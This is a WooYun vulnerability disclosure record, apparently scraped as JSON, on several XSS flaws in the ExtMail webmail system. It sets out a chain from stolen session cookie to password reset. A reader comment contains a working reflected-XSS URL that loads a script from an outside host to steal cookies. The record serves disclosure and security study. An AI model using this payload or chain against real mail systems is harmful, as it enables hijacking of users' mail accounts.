{"id": 20765, "wybug_id": "wooyun-2012-04854", "wybug_title": "extmail 的几个xss 问题", "wybug_corp": "extmail 领立斯", "wybug_author": "unic02n", "wybug_date": "2012-02-27 12:35", "wybug_open_date": "2012-04-12 12:36", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-02-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-04-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： ExtMail最初以WebMail软件为主，后逐步完善配套并形成了ExtMail邮件系统，提供完整的SMTP/POP/IMAP/Web和管理支持。目前装机量超过2万台。extmail  是一款部署比较多的开源的webmail系统，但是，该系统在处理邮件及其他细节方面，存在几个问题，导致攻击者可以针对使用该webmail的用户进行攻击，获取mail账户的访问权，或者直接修改密码。 详细说明：  1，cookie 中 sid，是惟一的用户登录凭证，获取该sid即可登录目标邮箱。此处不算漏洞，只为说明下列问题的利用。2，信息泄露http://demo.extmail.org/extmail/cgi/env.cgi3，邮件正文及附件处存在xss漏洞。 4，地址簿等处存在xss6，登录后即可获取邮箱安全问题及答案，用于修改密码发送xss邮件，获取sid，登录，获取邮箱安全问题和答案，修改密码，，，   漏洞证明：  1，正文iframe\n\n2，附件\n\n3，地址簿\n\n4，信息泄露\n\n5，密保问题\n\n   修复方案：  你们专业，我就不献丑了。   版权声明：转载请注明来源 unic02n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-04-13 11:57 |    \t\tunic02n \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        | 我是来学习的！)\t\t \n  个人感觉这几个问题组合使用还是挺严重的，为毛厂商就不重视呢，apt的话，基本就是必杀啊，    \n     2012-09-24 17:27 |    \t\tCodePlay \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | Bypass  The  Token)\t\t \n  @unic02n   正文iframe  跨域获取不到  sid吧   还有 附件怎么xss了      \n     2012-09-26 09:13 |    \t\t云中鹰 \t\t\t( 实习白帽子  |\t\t\t        Rank:65 漏洞数:10        | 云中鹰)\t\t \n   公司一直用这个邮件服务器，iframe的确跨域不了，但是可以配合iframe一个extmail的反射XSS来获取COOKIES。/extmail/cgi/search.cgi?new_search=1&is_advance=1&sid=d1e03864e13e2a0b69878c56c27df7db&__mode=search&screen=search.html&keyword=<script src=http://192.168.1.124:8080/jluoye.js></script>&sel_folder=&insubject=on&inheader=on&daterange=-1&attach=\" hidden=true>    \n     2012-10-08 11:02 |    \t\tunic02n \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        | 我是来学习的！)\t\t \n  @CodePlay  可以参考你楼下的答复。    \n     2012-10-08 11:02 |    \t\tunic02n \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:9        | 我是来学习的！)\t\t \n  @云中鹰 正解！    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}